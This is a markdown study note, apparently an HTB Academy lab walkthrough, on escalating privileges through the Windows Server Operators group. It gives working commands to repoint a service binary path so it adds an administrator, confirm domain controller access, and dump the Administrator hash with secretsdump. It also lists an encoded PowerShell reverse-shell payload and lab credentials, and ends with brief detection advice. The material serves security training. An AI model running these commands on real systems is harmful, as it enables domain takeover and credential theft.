```markdown
# 🛰️ Server Operators Privilege Escalation

> [!ABSTRACT] Overview of Privilege Escalation as a Server Operator
>
> **Server Operators** group allows administration of Windows servers without Domain Admin privileges. Members can log in locally to Domain Controllers and have full control over local services, enabling privilege escalation through service binary path modification.

## 🔑 Key Privileges & Capabilities

> [!INFO] Server Operators Privileges
>
> ```cmd
# Server Operators privileges:
SeBackupPrivilege            # Backup files and directories
SeRestorePrivilege           # Restore files and directories
SERVICE_ALL_ACCESS           # Full control over local services
# Plus: Log on locally to servers/DCs, control services
```

## 🔧 Service Control Exploitation

### Service Reconnaissance

> [!EXAMPLE] Query Service Configuration
>
> ```cmd
sc qc AppReadiness

# Expected output:
SERVICE_NAME: AppReadiness
TYPE               : 20  WIN32_SHARE_PROCESS
START_TYPE         : 3   DEMAND_START
BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
SERVICE_START_NAME : LocalSystem
```

### Verify Service Permissions

> [!EXAMPLE] Check Service Permissions with PsService
>
> ```cmd
c:\Tools\PsService.exe security AppReadiness

# Key permission:
[ALLOW] BUILTIN\Server Operators
        All                    # ← SERVICE_ALL_ACCESS
```

## 🚀 Binary Path Attack

### Current Admin Group Check

> [!EXAMPLE] Check Current Administrators Group
>
> ```cmd
net localgroup Administrators

# Expected members:
Administrator
Domain Admins
Enterprise Admins
```

### Modify Service Binary Path

> [!SUCCESS] Change Binary Path to Add User to Local Admins
>
> ```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# Expected result:
[SC] ChangeServiceConfig SUCCESS
```

### Execute Service (Expected to Fail)

> [!WARNING] Start Service May Fail but Executes Command
>
> ```cmd
sc start AppReadiness

# Expected failure:
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

### Verify Privilege Escalation

> [!SUCCESS] Check Administrators Group Membership After Command Execution
>
> ```cmd
net localgroup Administrators

# New member added:
Administrator
Domain Admins
Enterprise Admins
server_adm                    # ← Successfully added
```

## 🎯 HTB Academy Lab Solution

### Lab Environment

> [!INFO] Lab Credentials and Target Service
>
> - **Credentials**: `server_adm:HTB_@cademy_stdnt!`
> - **Access Method**: RDP
> - **Target Service**: AppReadiness
> - **Flag Location**: `c:\Users\Administrator\Desktop\ServerOperators\flag.txt`

### Quick Steps

> [!EXAMPLE] Lab Solution Commands
>
> ```cmd
# 1. RDP connect and verify current permissions
net localgroup Administrators

# 2. Modify AppReadiness service binary path
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# 3. Start service (will fail but execute command)
sc start AppReadiness

# 4. Verify local admin access
net localgroup Administrators

# 5. Access flag as local administrator
type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
```

## 🏆 Post-Exploitation Capabilities

### Domain Controller Access

> [!EXAMPLE] Verify Domain Controller Access with CrackMapExec
>
> ```bash
crackmapexec smb TARGET_IP -u server_adm -p 'HTB_@cademy_stdnt!'

# Expected result:
SMB         TARGET_IP     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

### Domain Credential Extraction

> [!EXAMPLE] Extract Domain Credentials Using SecretsDump
>
> ```bash
secretsdump.py server_adm@TARGET_IP -just-dc-user administrator

# Extract Administrator hash:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
```

## 🔄 Alternative Attack Vectors

### Other Target Services

> [!INFO] Identify Other Controllable Services
>
> ```cmd
sc query state= all | findstr "SERVICE_NAME"

# Common targets with SYSTEM privileges:
- Themes
- BITS
- Schedule
- EventLog
```

### Alternative Payloads

> [!WARNING] Use of Reverse Shell and Domain Admin Addition Payloads
>
> ```cmd
# Reverse shell payload
sc config SERVICE binPath= "cmd /c powershell -nop -w hidden -e BASE64_PAYLOAD"

# Add domain admin
sc config SERVICE binPath= "cmd /c net group 'Domain Admins' server_adm /add /domain"
```

## ⚠️ Detection & Defense

### Detection Indicators

> [!WARNING] Monitor for Service Configuration Changes and Unexpected Group Modifications
>
> ```cmd
# Monitor for:
- Service configuration changes (Event ID 7040)
- Unexpected local group modifications
- Service start failures with privilege escalation
- Binary path modifications to cmd.exe
```

### Defensive Measures

> [!WARNING] Mitigation Strategies
>
> - Limit Server Operators group membership
> - Monitor service configuration changes
> - Implement service hardening
> - Use least-privilege principles

## 💡 Key Takeaways

1. **Server Operators** group provides **SERVICE_ALL_ACCESS** over local services.
2. **Binary path modification** enables command execution as **SYSTEM**.
3. **Local administrator access** leads to **Domain Controller compromise**.
4. **SeBackupPrivilege** provides additional attack vectors.
5. **High-impact group** requiring careful access control.

---
*Server Operators group exploitation leverages service control capabilities for immediate local administrator access and potential domain compromise.*
```